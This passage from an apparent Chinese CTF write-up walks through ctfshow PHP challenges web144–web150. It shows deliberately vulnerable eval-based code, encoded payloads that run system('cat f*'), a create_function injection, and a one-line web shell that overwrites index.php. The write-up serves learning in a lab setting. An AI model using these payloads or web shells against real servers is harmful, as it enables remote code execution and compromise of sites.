</span></span><span class="line"><span class="ln">20</span><span class="cl">               <span class="n">s1</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">               <span class="n">s2</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">9</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">               <span class="k">break</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">       <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">   <span class="n">output</span><span class="o">=</span><span class="s2">&#34;(</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s1</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">^</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s2</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">)&#34;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">   <span class="k">return</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">   
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">   <span class="n">param</span><span class="o">=</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] your function：&#34;</span><span class="p">)</span> <span class="p">)</span><span class="o">+</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;[+] your command：&#34;</span><span class="p">))</span><span class="o">+</span><span class="s2">&#34;;&#34;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="n">param</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web144">web144<a hidden class="anchor" aria-hidden="true" href="#web144">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-18 16:21:15
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">check</span><span class="p">(</span><span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\W+$/&#39;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span>  <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$v1$v3$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$v1$v3$v2</span><span class="s2"> = &#34;</span><span class="o">.</span><span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="k">return</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">===</span><span class="mi">1</span><span class="o">?</span><span class="k">true</span><span class="o">:</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题跟143差不多，只是参数交换了一下位置</p>
<p>直接异或出了</p>
<pre tabindex="0"><code>?v1=1&amp;v2=-(&#34;%0c%06%0c%0b%05%0d&#34;^&#34;%7f%7f%7f%7f%60%60&#34;)(&#34;%03%01%0b%00%06%00&#34;^&#34;%60%60%7f%20%60%2a&#34;)&amp;v3=1
</code></pre><h4 id="web145">web145<a hidden class="anchor" aria-hidden="true" href="#web145">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-18 17:41:33
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&#34;/i&#39;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;get out hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span>  <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$v1$v3$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$v1$v3$v2</span><span class="s2"> = &#34;</span><span class="o">.</span><span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题ban掉了异或运算符^,同时也ban掉了加减乘除</p>
<p>但是我们还可以考虑构造三目运算符配合取反</p>
<p>payload:</p>
<pre tabindex="0"><code>/?v1=1&amp;v2=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):
</code></pre><h4 id="web146">web146<a hidden class="anchor" aria-hidden="true" href="#web146">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-18 17:41:33
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\}|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&#34;/i&#39;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;get out hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span>  <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$v1$v3$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$v1$v3$v2</span><span class="s2"> = &#34;</span><span class="o">.</span><span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题把三目运算符也ban了</p>
<p>可以考虑使用位运算符|</p>
<p><img alt="image-20250124223416316" loading="lazy" src="assets/image-20250124223416316.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>?v1=1&amp;v2=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|
</code></pre><h4 id="web147">web147<a hidden class="anchor" aria-hidden="true" href="#web147">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-19 02:04:38
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctf&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$ctfshow</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctf&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-z0-9_]*$/isD&#39;</span><span class="p">,</span><span class="nv">$ctfshow</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="nv">$ctfshow</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;show&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>create_function()代码注入</p>
<p>如果我们第二个参数传入 echo 1;}phpinfo();//
就等价于</p>
<pre tabindex="0"><code>function f($a) {
  echo 1;}phpinfo();//
}
从而执行phpinfo()命令
</code></pre><p>那要怎么绕过正则表达式呢</p>
<pre tabindex="0"><code>/^[a-z0-9_]*$/isD
</code></pre><p>这个正则表达式匹配所有的字母数字和下划线</p>
<p>而且由于</p>
<blockquote>
<p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法</p></blockquote>
<p>所以我们可以通过\create_function()来绕过这个正则表达式</p>
<p>payload:</p>
<pre tabindex="0"><code>GET show=;};system(&#39;cat f*&#39;);/*
POST ctf=\create_function
</code></pre><h4 id="web148">web148<a hidden class="anchor" aria-hidden="true" href="#web148">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-19 03:52:11
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span> <span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[A-Za-z0-9_\%</span><span class="se">\\</span><span class="s2">|\~\&#39;\,\.\:\@\&amp;\*\+\- ]+/&#34;</span><span class="p">,</span><span class="nv">$code</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="k">function</span> <span class="nf">get_ctfshow_fl0g</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>没ban异或运算符</p>
<p>payload:</p>
<pre tabindex="0"><code>(&#34;%08%02%08%09%05%0d&#34;^&#34;%7b%7b%7b%7d%60%60&#34;)(&#34;%03%01%09%01%06%02&#34;^&#34;%60%60%7d%21%60%28&#34;);
//system(&#34;cat f*&#34;);
</code></pre><h4 id="web149">web149<a hidden class="anchor" aria-hidden="true" href="#web149">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-19 04:34:40
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$files</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ctf&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;show&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="nv">$files</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>直接用一句话木马覆写掉index.php</p>
<pre tabindex="0"><code>GET ?ctf=index.php
POST show=&lt;?php @eval($_POST[&#39;1&#39;]);?&gt;
</code></pre><p>写入后</p>
<pre tabindex="0"><code>POST 1=system(&#39;cat /ctfshow_fl0g_here.txt&#39;);
</code></pre><h4 id="web150">web150<a hidden class="anchor" aria-hidden="true" href="#web150">#</a></h4>
<p>非预期 日志注入</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-19 07:12:57
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
